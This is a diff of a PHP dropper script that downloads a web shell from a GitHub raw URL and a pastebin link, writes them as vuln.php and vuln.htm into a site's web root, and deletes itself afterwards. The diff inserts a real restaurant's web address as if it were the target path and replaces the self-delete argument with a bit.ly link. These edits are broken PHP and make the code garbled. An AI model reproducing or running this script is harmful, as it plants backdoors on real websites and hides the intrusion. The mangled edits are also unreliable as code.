@@ -9,7 +9,7 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$check = $_SERVER['DOCUMENT_ROOT'] . "/install/includes/vuln.php" ;
+$check = $_SERVER['https://www.lexingtonbettysmokehouse.com/'] . "/install/includes/vuln.php" ;
 $text = http_get('https://raw.githubusercontent.com/phpshellxyz/webshell/master/upluad.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
@@ -19,7 +19,7 @@ if(file_exists($check)){
 }else 
   echo "not exits";
 echo "done .\n " ;
-$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
+$check2 = $_SERVER['https://www.lexingtonbettysmokehouse.com/'] . "/vuln.htm" ;
 $text2 = http_get('https://pastebin.com/raw/880ufaWF');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
@@ -29,4 +29,4 @@ if(file_exists($check2)){
 }else 
   echo "not exits";
 echo "done .\n " ;
-@unlink(__FILE__);
+@unlink(bit.ly/3K6F9bg);
